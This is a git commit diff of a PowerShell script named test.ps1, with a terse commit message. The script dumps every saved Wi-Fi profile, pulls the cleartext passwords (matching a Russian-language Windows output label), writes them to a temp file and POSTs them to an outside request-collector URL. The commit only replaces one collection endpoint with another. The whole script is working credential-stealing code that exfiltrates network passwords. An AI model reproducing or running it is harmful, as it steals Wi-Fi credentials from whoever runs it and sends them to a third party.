857adef995590535b5b16716874c0553cc4609d6
Luerl21 <dmyt20042@gmail.com>
2023-09-15 00:18:37 +0300

    1

--- test.ps1
+++ test.ps1
@@ -1,5 +1,5 @@
 $wifi = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Содержимое ключа\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ ESSID=$name;PASS=$pass }} | Format-Table -AutoSize
-$url = "https://eox19ny634t6muh.m.pipedream.net/aboba"
+$url = "https://requestbin.labs.degica.com/zoe2kszo"
 $wifi | Out-File tmp.txt
 $data = Get-Content ./tmp.txt
 Invoke-RestMethod -Uri $url -Method Post -Body $data
